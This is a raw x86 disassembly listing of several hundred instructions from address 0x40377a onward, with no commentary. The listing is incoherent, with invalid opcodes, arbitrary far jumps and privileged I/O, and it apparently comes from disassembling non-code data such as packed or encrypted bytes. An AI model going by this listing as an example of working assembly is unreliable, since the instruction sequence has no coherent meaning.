  40377a:	mov    dh,0xa0
  40377c:	mov    ebx,0x35c17cbf
  403781:	sub    al,bh
  403783:	es out 0xc6,al
  403786:	aad    0x38
  403788:	out    dx,eax
  403789:	fstp   QWORD PTR [eax+ebx*1+0x24a7cd89]
  403790:	push   es
  403791:	pop    DWORD PTR [ebp+0x44]
  403794:	add    eax,DWORD PTR [edi]
  403796:	loopne 0x4037c9
  403798:	pop    esp
  403799:	mov    eax,ds:0xc1a8f518
  40379e:	fbld   TBYTE PTR [ebp-0x79]
  4037a1:	xchg   BYTE PTR [edi+eax*1+0x7789db45],ch
  4037a8:	push   edx
  4037a9:	pop    ebp
  4037aa:	push   ebp
  4037ab:	push   esi
  4037ac:	jo     0x40377d
  4037ae:	jge    0x4037c9
  4037b0:	rcr    DWORD PTR [edi-0x7d],1
  4037b3:	imul   esi,DWORD PTR [eax+0x28],0x44
  4037b7:	mov    ebx,0xeae19dd8
  4037bc:	dec    edx
  4037bd:	rol    BYTE PTR [esi-0x67],1
  4037c0:	push   ds
  4037c1:	ret    0x4ff8
  4037c4:	pop    esi
  4037c5:	fidiv  WORD PTR [eax+eiz*4]
  4037c8:	je     0x40376b
  4037ca:	pminub mm0,QWORD PTR [eax-0x13]
  4037ce:	xchg   ecx,eax
  4037cf:	js     0x4037fe
  4037d1:	adc    DWORD PTR [bp+si+0xd],esi
  4037d5:	jg     0x4037df
  4037d7:	aad    0xd1
  4037d9:	mov    fs,edi
  4037db:	mov    ch,0xb6
  4037dd:	leave  
  4037de:	js     0x4037a6
  4037e0:	into   
  4037e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037e2:	mov    BYTE PTR [edx],al
  4037e4:	cs pop ss
  4037e6:	adc    DWORD PTR [eax],esi
  4037e8:	xchg   edx,eax
  4037e9:	nop
  4037ea:	or     dl,dh
  4037ec:	repnz add DWORD PTR [ecx],esi
  4037ef:	add    al,0xf5
  4037f1:	iret   
  4037f2:	cmp    al,0xc5
  4037f4:	dec    ebp
  4037f5:	(bad)  
  4037f6:	dec    esp
  4037f7:	retf   
  4037f8:	aas    
  4037f9:	clc    
  4037fa:	jecxz  0x403868
  4037fc:	add    bh,BYTE PTR [ebx]
  4037fe:	dec    ebp
  4037ff:	jne    0x4037b9
  403801:	mov    ah,0x2b
  403803:	xchg   esp,eax
  403804:	dec    esp
  403805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403806:	xor    eax,DWORD PTR [esi]
  403808:	es data16 sub al,0xb4
  40380d:	xor    eax,ebx
  40380f:	mov    ebx,0x6272ee10
  403814:	jae    0x4037bb
  403816:	cmp    al,0xa4
  403818:	leave  
  403819:	mov    bl,0x9d
  40381b:	cs inc ecx
  40381d:	call   0xdf77:0x9e5696ee
  403824:	mul    BYTE PTR [edx+0x2d]
  403827:	int    0x8d
  403829:	cmp    cl,BYTE PTR [ebx+edx*8]
  40382c:	xor    sp,WORD PTR [esi]
  40382f:	aam    0xf6
  403831:	outs   dx,BYTE PTR ds:[esi]
  403832:	add    cl,BYTE PTR [ebp+0x2e03056a]
  403838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403839:	sbb    eax,0x28c81b0b
  40383e:	mul    BYTE PTR [eax+0x70]
  403841:	or     BYTE PTR [ecx],0x5f
  403844:	outs   dx,BYTE PTR ds:[esi]
  403845:	daa    
  403846:	push   ecx
  403847:	cmc    
  403848:	je     0x403805
  40384a:	adc    al,BYTE PTR [edx]
  40384c:	jae    0x4038a3
  40384e:	xchg   edx,eax
  40384f:	mov    al,ds:0xe4d51584
  403854:	pop    ss
  403855:	sbb    BYTE PTR [ebp-0x7f586df2],dl
  40385b:	call   0xc3ef:0xe8c5597d
  403862:	push   ecx
  403863:	rcr    BYTE PTR [edx-0x1f1cc936],0x37
  40386a:	mov    ebp,0x40a8ad3
  40386f:	cmc    
  403870:	pop    eax
  403871:	in     al,0x7
  403873:	jp     0x403844
  403875:	cwde   
  403876:	aaa    
  403877:	inc    ecx
  403878:	inc    esp
  403879:	int    0x6c
  40387b:	push   ds
  40387c:	push   es
  40387d:	mov    WORD PTR [esi],gs
  40387f:	xchg   edx,eax
  403880:	daa    
  403881:	push   esi
  403882:	(bad)  
  403883:	into   
  403884:	sub    ebx,edx
  403886:	hlt    
  403887:	out    0xab,al
  403889:	repz xchg ecx,eax
  40388b:	push   edi
  40388c:	hlt    
  40388d:	jae    0x4038a1
  40388f:	xchg   ebx,eax
  403890:	mov    ch,0xba
  403892:	ss sbb ebx,eax
  403895:	ja     0x403821
  403897:	test   al,0x78
  403899:	push   eax
  40389a:	push   ss
  40389b:	neg    BYTE PTR [esi+0x2c]
  40389e:	call   0xba16:0x552bac46
  4038a5:	jo     0x4038f1
  4038a7:	ret    
  4038a8:	shl    DWORD PTR [esi+eax*8-0xbe2093],1
  4038af:	push   cs
  4038b0:	push   edi
  4038b1:	dec    esp
  4038b2:	js     0x40388b
  4038b4:	in     al,0x74
  4038b6:	fcomp  QWORD PTR [ebx+0x64929504]
  4038bc:	mov    dl,0x62
  4038be:	lds    edx,FWORD PTR [edx+ecx*4+0x17922c6d]
  4038c5:	jecxz  0x403945
  4038c7:	jae    0x40392c
  4038c9:	and    DWORD PTR [ebx],ecx
  4038cb:	cs nop
  4038cd:	lds    eax,FWORD PTR [edi]
  4038cf:	sub    al,0xb
  4038d1:	push   0x55
  4038d3:	sbb    BYTE PTR [ebp-0x211578ca],dh
  4038d9:	dec    edx
  4038da:	loope  0x40394c
  4038dc:	push   edx
  4038dd:	add    DWORD PTR [eax-0x6852060c],ecx
  4038e3:	in     al,dx
  4038e4:	shl    esp,0x5d
  4038e7:	jg     0x4038f9
  4038e9:	aam    0x56
  4038eb:	mov    ebp,DWORD PTR [ebx]
  4038ed:	xlat   BYTE PTR ds:[ebx]
  4038ee:	data16 or dh,BYTE PTR [ebx+0x621c4a93]
  4038f5:	dec    esi
  4038f6:	jo     0x403893
  4038f8:	sub    BYTE PTR [ecx+0x25],bh
  4038fb:	repnz inc esp
  4038fd:	ror    esi,0xad
  403900:	jne    0x40390f
  403902:	jns    0x403894
  403904:	cmp    ecx,ebx
  403906:	ins    DWORD PTR es:[edi],dx
  403907:	xchg   edx,eax
  403908:	test   DWORD PTR [edx-0x37],eax
  40390b:	mov    edx,0xfecffc6d
  403910:	fucomp st(6)
  403912:	sbb    DWORD PTR [ebp-0x53d3e5db],eax
  403918:	sar    BYTE PTR [edx+0x33dafcec],1
  40391e:	or     al,0x23
  403920:	or     BYTE PTR [esi+ebp*1+0x1e129bdf],ah
  403927:	cs lock add al,0xac
  40392b:	jmp    0xf0b57862
  403930:	jmp    0x4e97c488
  403935:	push   0x1be3b9d5
  40393a:	sub    eax,0x73416e08
  40393f:	pop    esi
  403940:	retf   0x17f6
  403943:	push   ecx
  403944:	mov    eax,0xa856ad2
  403949:	stos   DWORD PTR es:[edi],eax
  40394a:	mov    dh,0x51
  40394c:	add    al,0xd9
  40394e:	dec    ebp
  40394f:	enter  0x1029,0x4e
  403953:	es adc eax,0x7b13dfb8
  403959:	cdq    
  40395a:	adc    eax,0x9a5acc0b
  40395f:	sub    ebp,esi
  403961:	adc    DWORD PTR [esi+0x1d0e7e31],edx
  403967:	add    dl,al
  403969:	add    DWORD PTR [ecx+0x64],esi
  40396c:	ins    DWORD PTR es:[edi],dx
  40396d:	test   DWORD PTR [edi],esi
  40396f:	mov    edx,esi
  403971:	adc    BYTE PTR [ebx-0x27fbf558],dh
  403977:	enter  0xc0a5,0x46
  40397b:	int3   
  40397c:	adc    BYTE PTR [esi-0x3ce91aa0],dl
  403982:	dec    eax
  403983:	repz lock fs jae 0x4039ee
  403988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40398a:	mov    WORD PTR [ebp+0x5],gs
  40398d:	cmp    al,0x45
  40398f:	xchg   esp,eax
  403990:	out    dx,al
  403991:	loope  0x403938
  403993:	loop   0x40398e
  403995:	pop    esi
  403996:	mov    ebp,0xf6953f08
  40399b:	mov    bh,0xf3
  40399d:	cmp    eax,0x2c5deda5
  4039a2:	les    ebp,FWORD PTR [edi-0x2f]
  4039a5:	cld    
  4039a6:	push   esp
  4039a7:	dec    edx
  4039a8:	cmc    
  4039a9:	out    dx,al
  4039aa:	shr    DWORD PTR [ecx],1
  4039ac:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4039ae:	and    BYTE PTR ds:0xece96017,bh
  4039b4:	jge    0x4039a1
  4039b6:	daa    
  4039b7:	test   al,0x14
  4039b9:	arpl   WORD PTR [ebp-0x2d],di
  4039bc:	inc    eax
  4039bd:	or     al,0x5e
  4039bf:	push   cs
  4039c0:	and    DWORD PTR [ecx+0x4d],esi
  4039c3:	mov    edi,0x6bb8620
  4039c8:	sti    
  4039c9:	pop    ecx
  4039ca:	dec    ecx
  4039cb:	sbb    cl,ah
  4039cd:	or     bl,ah
  4039cf:	sbb    ch,dl
  4039d1:	push   ebx
  4039d2:	push   ecx
  4039d3:	add    bl,BYTE PTR [ecx]
  4039d5:	sub    edi,edx
  4039d7:	rcl    DWORD PTR [edx],1
  4039d9:	adc    al,bl
  4039db:	pop    ecx
  4039dc:	adc    esi,ebp
  4039de:	adc    BYTE PTR [esp+eiz*2],bh
  4039e1:	rcr    BYTE PTR [ecx+0x75d6df72],0xed
  4039e8:	jmp    0x94a28043
  4039ed:	xor    ebx,DWORD PTR [eax+esi*1-0x59931e81]
  4039f4:	dec    DWORD PTR [eax]
  4039f6:	mov    cl,dl
  4039f8:	sbb    ah,BYTE PTR [eax-0x29]
  4039fb:	(bad)
  4039fe:	ins    DWORD PTR es:[edi],dx
  4039ff:	sub    esi,DWORD PTR ds:0x3615fde5
  403a05:	xlat   BYTE PTR ds:[ebx]
  403a06:	cs adc al,0xeb
  403a09:	sti    
  403a0a:	or     BYTE PTR [ebx],bl
  403a0c:	lahf   
  403a0d:	jnp    0x403a04
  403a0f:	pop    eax
  403a10:	pop    ebp
  403a11:	push   0xa5148706
  403a16:	test   BYTE PTR [eax],0xf7
  403a19:	aas    
  403a1a:	inc    ecx
  403a1b:	scas   eax,DWORD PTR es:[edi]
  403a1c:	jbe    0x4039ef
  403a1e:	or     DWORD PTR ds:0x67a0050,edx
  403a24:	je     0x403aa5
  403a26:	inc    ecx
  403a27:	in     al,dx
  403a28:	add    ah,BYTE PTR [eax]
  403a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a2b:	cmp    ah,BYTE PTR [ecx]
  403a2d:	jmp    DWORD PTR [eax]
  403a2f:	repnz pop ebp
  403a31:	mov    edi,0xaa644526
  403a36:	adc    al,0x69
  403a38:	mov    ebx,es
  403a3a:	jbe    0x4039d5
  403a3c:	or     DWORD PTR ds:[ebx+0x31],esi
  403a40:	and    dh,BYTE PTR [ecx+0x32]
  403a43:	jo     0x403a4c
  403a45:	gs out 0x60,al
  403a48:	loopne 0x403ab3
  403a4a:	adc    DWORD PTR [edi+ebx*2],ecx
  403a4d:	and    al,ch
  403a4f:	ret    0xdf13
  403a52:	retf   0xcb03
  403a55:	repz xchg ebx,eax
  403a57:	lods   al,BYTE PTR ds:[esi]
  403a58:	push   es
  403a59:	cdq    
  403a5a:	retf   
  403a5b:	(bad)  
  403a5c:	or     esi,esp
  403a5e:	fwait
  403a5f:	pop    ss
  403a60:	mov    edx,0xc61cfb24
  403a65:	cdq    
  403a66:	push   0x1b
  403a68:	(bad)  
  403a69:	push   ecx
  403a6a:	inc    ebx
  403a6b:	jle    0x403a65
  403a6d:	and    BYTE PTR [edx+0x15],al
  403a70:	push   0x3c515254
  403a75:	(bad)
  403a78:	mov    bh,0xeb
  403a7a:	das    
  403a7b:	enter  0xab76,0x38
  403a7f:	jno    0x403a26
  403a81:	out    dx,eax
  403a82:	in     eax,0x17
  403a84:	jmp    0x403a72
  403a86:	add    esp,DWORD PTR [ecx+edi*4]
  403a89:	xchg   edx,eax
  403a8a:	push   esi
  403a8b:	dec    esi
  403a8c:	push   es
  403a8d:	stos   DWORD PTR es:[edi],eax
  403a8e:	dec    ebx
  403a8f:	test   ebx,0x858b1c7a
  403a95:	lahf   
  403a96:	hlt    
  403a97:	cli    
  403a98:	cmp    esi,ebx
  403a9a:	push   ss
  403a9b:	sub    eax,0x2ac4b277
  403aa0:	rcl    BYTE PTR [edx-0x1b18c690],0xd4
  403aa7:	lods   al,BYTE PTR ds:[esi]
  403aa8:	xchg   esi,eax
  403aa9:	xor    dl,bl
  403aab:	into   
  403aac:	das    
  403aad:	sbb    cl,BYTE PTR [edi+0x13417378]
  403ab3:	(bad)  
  403ab5:	mov    ch,0x37
  403ab7:	jno    0x403a5f
  403ab9:	mov    ebx,DWORD PTR [eax]
  403abb:	xchg   esi,eax
  403abc:	ret    
  403abd:	outs   dx,BYTE PTR ds:[esi]
  403abe:	xor    DWORD PTR [ebp+0x3e0a5e65],0xf961b39
  403ac8:	popf   
  403ac9:	ret    
  403aca:	sub    BYTE PTR [esi+eax*4],0x7e
  403ace:	rcr    cl,0x46
  403ad1:	js     0x403a65
  403ad3:	popf   
  403ad4:	mov    ecx,edi
  403ad6:	adc    ecx,DWORD PTR [ebx]
  403ad8:	ret    
  403ad9:	push   0xffffffc2
  403adb:	loopne 0x403b23
  403add:	adc    eax,0xdce07b41
  403ae2:	out    dx,eax
  403ae3:	call   0x91741e1c
  403ae8:	cmp    cl,BYTE PTR [edx-0x7a]
  403aeb:	not    bl
  403aed:	jmp    0xf1b9:0x183a105f
  403af4:	xor    DWORD PTR [ecx-0x10146567],ebx
  403afa:	xchg   ebx,eax
  403afb:	pop    ebp
  403afc:	sbb    al,0xe9
  403afe:	fs dec esp
  403b00:	mov    ds,WORD PTR [esi+edx*8]
  403b03:	fwait
  403b04:	mov    WORD PTR [edi+esi*2-0x6e03e671],ss
  403b0b:	sbb    DWORD PTR [ebx-0x20382515],eax
  403b11:	mov    ebx,0x865e0ad1
  403b16:	mov    bh,BYTE PTR [ecx-0x591b4422]
  403b1c:	push   eax
  403b1d:	inc    edi
  403b1e:	ja     0x403ac5
  403b20:	loop   0x403ae8
  403b22:	retf   
  403b23:	xor    ebp,DWORD PTR [edx-0x45]
  403b26:	add    BYTE PTR [esi+0x57],0xc3
  403b2a:	xchg   edi,eax
  403b2b:	fs into 
  403b2d:	adc    esp,esp
  403b2f:	dec    esp
  403b30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b31:	mov    bh,0xc6
  403b33:	mov    dl,0x1e
  403b35:	cmp    BYTE PTR ds:0x55935497,0x37
  403b3c:	and    BYTE PTR [edi],cl
  403b3e:	or     eax,DWORD PTR [eax+0x53]
  403b41:	add    DWORD PTR ds:0xd08f9a95,0x1c47631b
  403b4b:	sub    eax,0x5e9f5afb
  403b50:	jmp    0x403b68
  403b52:	xor    BYTE PTR [esi+0x4],bl
  403b55:	push   es
  403b56:	mov    ebp,DWORD PTR [eax-0x30]
  403b59:	mov    ah,BYTE PTR [eax+ecx*1+0x4e]
  403b5d:	jne    0xa0802500
  403b63:	aas    
  403b64:	and    al,0xc
  403b66:	mov    cl,0x8c
  403b68:	sub    eax,0x9e4b703c
  403b6d:	mov    ?,WORD PTR ds:0x3d925be7
  403b73:	sbb    eax,ebx
  403b75:	cdq    
  403b76:	and    eax,0x1f21dc34
  403b7b:	scas   eax,DWORD PTR es:[edi]
  403b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b7d:	or     bh,BYTE PTR [eax+eiz*8]
  403b80:	xor    ecx,esp
  403b82:	fcom   st(5)
  403b84:	push   edi
  403b85:	(bad)  
  403b86:	aas    
  403b87:	imul   BYTE PTR [eax-0xc]
  403b8a:	mov    ch,0x70
  403b8c:	aam    0xe6
  403b8e:	xor    eax,ebp
  403b90:	test   DWORD PTR [ebx-0x42],esi
  403b93:	jge    0x403b50
  403b95:	adc    al,0x47
  403b97:	inc    edi
  403b98:	or     eax,0xec7542b3
  403b9d:	add    eax,0x11dd8fed
  403ba2:	mov    BYTE PTR [edi+0x68c1e7ea],ch
  403ba8:	aas    
  403ba9:	pushf  
  403baa:	cmp    eax,0xd4009589
  403baf:	dec    esi
  403bb0:	dec    edx
  403bb1:	adc    ecx,DWORD PTR [ebx-0x4cef40d5]
  403bb7:	scas   eax,DWORD PTR es:[edi]
  403bb8:	jns    0x403bf1
  403bba:	xor    eax,0x540812c8
  403bbf:	push   ss
  403bc0:	into   
  403bc1:	inc    ecx
  403bc2:	stos   DWORD PTR es:[edi],eax
  403bc3:	sbb    eax,0x283920e6
  403bc8:	pop    es
  403bc9:	push   ds
  403bca:	mov    ah,0xe8
  403bcc:	cld    
  403bcd:	mov    esp,0xb6b0cab6
  403bd2:	in     eax,dx
  403bd3:	sbb    BYTE PTR [eax+0x40],cl
  403bd6:	dec    eax
  403bd7:	add    al,0xca
  403bd9:	arpl   WORD PTR [ebp+0x11],si
  403bdc:	ds in  al,0x41
  403bdf:	cld    
  403be0:	jbe    0x403b98
  403be2:	lods   eax,DWORD PTR ds:[esi]
  403be3:	(bad)  
  403be4:	aam    0x40
  403be6:	pop    esp
  403be7:	mov    dh,0x48
  403be9:	bound  di,DWORD PTR [edi+0x5f]
  403bed:	stos   DWORD PTR es:[edi],eax
  403bee:	mov    dh,0x61
  403bf0:	test   al,0xdb
  403bf2:	sbb    al,0x6d
  403bf4:	push   edi
  403bf5:	or     eax,0xd467ec05
  403bfa:	dec    edi
  403bfb:	rcr    DWORD PTR [edx-0x54],1
  403bfe:	(bad)  
  403c00:	ret    0x7c12
  403c03:	push   edx
  403c04:	xor    eax,0x7358810b
  403c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c0a:	ins    BYTE PTR es:[edi],dx
  403c0b:	clc    
  403c0c:	jnp    0x403b99
  403c0e:	jns    0x403c75
  403c10:	mov    al,ds:0xa92c3473
  403c15:	pop    edx
  403c16:	xchg   ecx,eax
  403c17:	or     eax,0x490b4cb4
  403c1c:	jmp    0xb2ceaed0
  403c21:	dec    eax
  403c22:	(bad)
  403c26:	sbb    DWORD PTR [ecx-0x2c8b476b],esp
  403c2c:	jmp    FWORD PTR [eax-0x1b]
  403c2f:	fdivr  DWORD PTR [edx]
  403c31:	jmp    0x52809f60
  403c36:	jge    0x403c01
  403c38:	mov    esp,0xdbca872c
  403c3d:	push   esi
  403c3e:	leave  
  403c3f:	popa   
  403c40:	adc    bl,BYTE PTR [ebx-0x54801ed0]
  403c46:	dec    ebx
  403c47:	repz mov esi,0x503c0d5d
  403c4d:	sahf   
  403c4e:	fld    TBYTE PTR [ebp+0x24f0c5d]
  403c54:	mov    ecx,0x6942ad7b
  403c59:	or     BYTE PTR [ebx+0x5e],bl
  403c5c:	retf   0xf457
  403c5f:	int    0xa7
  403c61:	xchg   edx,eax
  403c62:	scas   eax,DWORD PTR es:[edi]
  403c63:	out    dx,eax
  403c64:	retf   
  403c65:	adc    eax,0x7bd6e230
  403c6a:	pop    ebx
  403c6b:	sbb    ah,0x12
  403c6e:	pop    ebx
  403c6f:	and    bh,BYTE PTR [ecx+0x36386e95]
  403c75:	rol    BYTE PTR [eax],0x83
  403c78:	inc    edi
  403c79:	rol    DWORD PTR [ecx-0x234d02fc],cl
  403c7f:	call   0x2378e21a
  403c84:	xor    eax,0x654b1112
  403c89:	cdq    
  403c8a:	jmp    DWORD PTR [edx+0x66]
  403c8d:	int    0xc2
  403c8f:	fimul  DWORD PTR [ecx]
  403c91:	sbb    bh,cl
  403c93:	(bad)  [ebp-0x5bc54cc1]
  403c99:	pop    esp
  403c9a:	mov    eax,ds:0xd46f63a8
  403c9f:	jl     0x403c97
  403ca1:	mov    WORD PTR [ecx],ss
  403ca3:	and    ecx,DWORD PTR [ebp+0x2c6967e0]
  403ca9:	add    ecx,DWORD PTR [ecx-0x7ed31a44]
  403caf:	idiv   DWORD PTR [ebx+ebx*2-0x41]
  403cb3:	push   0x669dbf52
  403cb8:	pop    es
  403cb9:	(bad)  
  403cba:	xchg   esi,eax
  403cbb:	and    eax,0x6de4b0d8
  403cc0:	xchg   BYTE PTR [eax+ebx*8-0x65],cl
  403cc4:	sbb    dh,BYTE PTR [ebx+0x58]
  403cc7:	jmp    0xfb37:0x53451c6c
  403cce:	jecxz  0x403c78
  403cd0:	cmp    eax,0x6356d9fc
  403cd5:	pop    ecx
  403cd6:	inc    ecx
  403cd7:	xor    BYTE PTR [edx],dl
  403cd9:	ret    0x4467
  403cdc:	iret   
  403cdd:	mov    dh,0x6
  403cdf:	dec    esp
  403ce0:	iret   
  403ce1:	out    dx,eax
  403ce2:	inc    eax
  403ce3:	and    ebx,edi
  403ce5:	outs   dx,DWORD PTR ds:[esi]
  403ce6:	mov    ss,WORD PTR [edx]
  403ce8:	cmp    eax,0xc2a6f568
  403ced:	cs push edx
  403cef:	ss jbe 0x403ca2
  403cf2:	cli    
  403cf3:	dec    ebp
  403cf4:	repz in al,dx
  403cf6:	call   0xa3ad2278
  403cfb:	clc    
  403cfc:	adc    ch,bh
  403cfe:	xchg   DWORD PTR [eax+0x40],eax
  403d01:	mov    bl,BYTE PTR [esi]
  403d03:	sub    al,0xeb
  403d05:	jmp    0x3d13:0xcf4c8d02
  403d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d0d:	mov    ds:0xcbde96b4,al
  403d12:	push   0xffffff91
  403d14:	sbb    DWORD PTR [esi+0x2],ebp
  403d17:	mov    ch,0x37
  403d19:	into   
  403d1a:	rcr    DWORD PTR [ebp+0x2c3e5309],cl
  403d20:	es pop esp
  403d22:	sub    eax,0x8cb1ea3c
  403d27:	or     DWORD PTR [ecx+ebp*8-0x3e],edx
  403d2b:	cmc    
  403d2c:	dec    eax
  403d2d:	sbb    dl,BYTE PTR [ebp+eiz*1+0x4c]
  403d31:	je     0x403cce
  403d33:	jp     0x403d4c
  403d35:	sub    BYTE PTR [ebx-0x35],al
  403d38:	std    
  403d39:	xor    esi,DWORD PTR [edi-0x299eeba7]
  403d3f:	bound  edx,QWORD PTR [edi-0x31]
  403d42:	fbstp  TBYTE PTR [edi]
  403d44:	loopne 0x403d40
  403d46:	pop    ebp
  403d47:	ss jnp 0x403ce5
  403d4a:	push   ecx
  403d4b:	inc    esi
  403d4c:	jmp    0xab209d2a
  403d51:	dec    esi
  403d52:	fs fs mov edx,0xceb6fa27
  403d59:	shl    esp,1
  403d5b:	cld    
  403d5c:	call   0xacc29396
  403d61:	jg     0x403daa
  403d63:	pop    ebx
  403d64:	ins    DWORD PTR es:[edi],dx
  403d65:	loope  0x403d85
  403d67:	jno    0x403d98
  403d69:	daa    
  403d6a:	sbb    eax,0xd63bd006
  403d6f:	inc    edx
  403d70:	mov    ah,0x85
  403d72:	dec    edi
  403d73:	aaa    
  403d74:	test   BYTE PTR ds:0xf9a35a85,ch
  403d7a:	shl    DWORD PTR [eax+ebx*4+0x22965239],cl
  403d81:	inc    edi
  403d82:	enter  0x80e,0xf5
  403d86:	into   
  403d87:	test   BYTE PTR [ecx+esi*1],ah
  403d8a:	popa   
  403d8b:	sub    eax,0x8e87cad0
  403d90:	mov    ch,BYTE PTR [edx+ebx*1+0x1]
  403d94:	mov    ebx,0xfb8a0803
  403d99:	sub    al,0x93
  403d9b:	pop    ecx
  403d9c:	cli    
  403d9d:	push   ebx
  403d9e:	gs (bad) 
  403da0:	mov    ch,0xee
  403da2:	mov    esi,0x18ee0936
  403da7:	sbb    DWORD PTR [ebp-0x1b],ebx
  403daa:	mov    ds:0x2e8f83bb,al
  403daf:	push   eax
  403db0:	pop    edx
  403db1:	jo     0x403ddd
  403db3:	jge    0x403d8c
  403db5:	sbb    DWORD PTR [esi],eax
  403db7:	adc    ebx,esi
  403db9:	adc    eax,0x57720ae2
  403dbe:	jg     0x403d9a
  403dc0:	push   ss
  403dc1:	jne    0x403e30
  403dc3:	aas    
  403dc4:	outs   dx,BYTE PTR ds:[esi]
  403dc5:	mov    cl,0x16
  403dc7:	push   ds
  403dc8:	sar    DWORD PTR [edx-0x459b6117],cl
  403dce:	(bad)  
  403dcf:	adc    al,0xaf
  403dd1:	ins    DWORD PTR es:[edi],dx
  403dd2:	shr    BYTE PTR [ecx+0x57],0x0
  403dd6:	(bad)  
  403dd7:	dec    esi
  403dd8:	add    DWORD PTR [eax+0x4957910],0xef96e856
  403de2:	xchg   edx,eax
  403de3:	jle    0x403e03
  403de5:	jns    0x403dc3
  403de7:	stc    
  403de8:	loope  0x403db1
  403dea:	(bad)  
  403deb:	xchg   edx,eax
  403dec:	pop    ebx
  403ded:	fsub   QWORD PTR [ebp+0x54]
  403df0:	inc    esp
  403df1:	loope  0x403da9
  403df3:	outs   dx,DWORD PTR ds:[esi]
  403df4:	(bad)  
  403df5:	enter  0xa2a,0xd6
  403df9:	mov    edx,0xda31eab6
  403dfe:	sub    BYTE PTR [esi-0x3036fa06],0xc8
  403e05:	lock cmp dh,BYTE PTR cs:[ebx+0x454a2f6d]
  403e0d:	push   ss
  403e0e:	loop   0x403e4b
  403e10:	or     eax,0xffab6241
  403e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e16:	lods   eax,DWORD PTR ds:[esi]
  403e17:	mov    DWORD PTR [esi],esp
  403e19:	mov    dl,0xff
  403e1b:	shr    DWORD PTR [ebp-0xac13b73],0xe7
  403e22:	add    eax,DWORD PTR [esi+0x666bc316]
  403e28:	pop    es
  403e29:	cmp    WORD PTR [ebp+0x7d],bp
  403e2d:	in     eax,0x72
  403e2f:	popa   
  403e30:	fisub  DWORD PTR [edi+0x31624c73]
  403e36:	push   0x9634310c
  403e3b:	jp     0x403e8c
  403e3d:	push   ebp
  403e3e:	mov    ah,dl
  403e40:	xchg   DWORD PTR [ebx+0x16],ebx
  403e43:	xchg   esp,eax
  403e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e45:	push   0x40dfa597
  403e4a:	inc    edx
  403e4b:	cdq    
  403e4c:	or     bl,BYTE PTR ds:0x99171d0
  403e52:	daa    
  403e53:	cmp    eax,0xaa05f85d
  403e58:	xor    al,0x26
  403e5a:	fistp  WORD PTR [esi]
  403e5c:	xchg   ebp,eax
  403e5d:	call   0x200ba1a5
  403e62:	xchg   ebp,eax
  403e63:	add    bl,BYTE PTR [edx-0x55]
  403e66:	jle    0x403e88
  403e68:	mov    DWORD PTR [ecx+eiz*8-0x166b2c24],esp
  403e6f:	sti    
  403e70:	jge    0x403e81
  403e72:	mov    al,ds:0xd98eabfc
  403e77:	bound  eax,QWORD PTR [esi-0x1e]
  403e7a:	push   0xfffffff6
  403e7c:	fldcw  WORD PTR [edx]
  403e7e:	inc    esp
  403e7f:	call   0x9369288c
  403e84:	loopne 0x403e42
  403e86:	pop    ebx
  403e87:	test   BYTE PTR ds:0x99c84746,bh
  403e8d:	jg     0x403f00
  403e8f:	jno    0x403e35
  403e91:	or     eax,0xb242fd3b
  403e96:	cdq    
  403e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e98:	ret    0x6a9c
  403e9b:	cmp    al,0x9b
  403e9d:	push   esi
  403e9e:	not    DWORD PTR [edx-0x38]
  403ea1:	div    DWORD PTR [eax]
  403ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea4:	xor    BYTE PTR [ecx+0x6a],cl
  403ea7:	cli    
  403ea8:	rol    BYTE PTR [ecx+0x5a8f90f8],cl
  403eae:	mov    ch,0x30
  403eb0:	out    dx,eax
  403eb1:	add    al,0x8d
  403eb3:	and    dl,BYTE PTR ds:0xb3062c3a
  403eb9:	jecxz  0x403ea3
  403ebb:	and    DWORD PTR [ebp+0x11669e79],ecx
  403ec1:	mov    ah,0x49
  403ec3:	ucomiss xmm4,DWORD PTR [edx]
  403ec6:	arpl   WORD PTR [ebp+edi*8-0x43286c4],cx
  403ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ece:	push   esi
  403ecf:	dec    ebp
  403ed0:	rol    DWORD PTR [edi+0x2d],1
  403ed3:	and    esi,esp
  403ed5:	test   ah,0x2b
  403ed8:	pop    es
  403ed9:	pop    ds
  403eda:	or     esp,edi
  403edc:	jmp    0x403e84
  403ede:	jmp    FWORD PTR [ecx-0x9]
  403ee1:	mov    ecx,0x4637ef5e
  403ee6:	lods   al,BYTE PTR ds:[esi]
  403ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ee8:	mov    ds:0x29242a8f,eax
  403eed:	xor    BYTE PTR [edx-0x65],bh
  403ef0:	in     al,0x1e
  403ef2:	and    bl,BYTE PTR [ebx+edx*8+0x71ffc81]
  403ef9:	mov    edi,DWORD PTR [ebx-0x6e]
  403efc:	(bad)  
  403efd:	sbb    DWORD PTR [edx-0x3bae25e3],ebx
  403f03:	adc    BYTE PTR [eax],al
  403f05:	in     al,dx
  403f06:	xchg   edx,eax
  403f07:	aaa    
  403f08:	test   al,0x58
  403f0a:	mov    DWORD PTR ds:[esi],eax
  403f0d:	ss dec esp
  403f0f:	mov    WORD PTR [ebx+0x11],ds
  403f12:	rcr    DWORD PTR [eax+0x3c],0x23
  403f16:	xlat   BYTE PTR ds:[ebx]
  403f17:	es jo  0x403efd
  403f1a:	das    
  403f1b:	inc    ebx
  403f1c:	xchg   esp,eax
  403f1d:	mov    ebp,0x6bb8952b
  403f22:	jno    0x403ee7
  403f24:	pop    ebp
  403f25:	or     eax,0x915d0fc4
  403f2a:	outs   dx,BYTE PTR ds:[esi]
  403f2b:	clc    
  403f2c:	(bad)  
  403f2d:	sar    BYTE PTR [edx],1
  403f2f:	cmp    BYTE PTR [ebp-0x11],bl
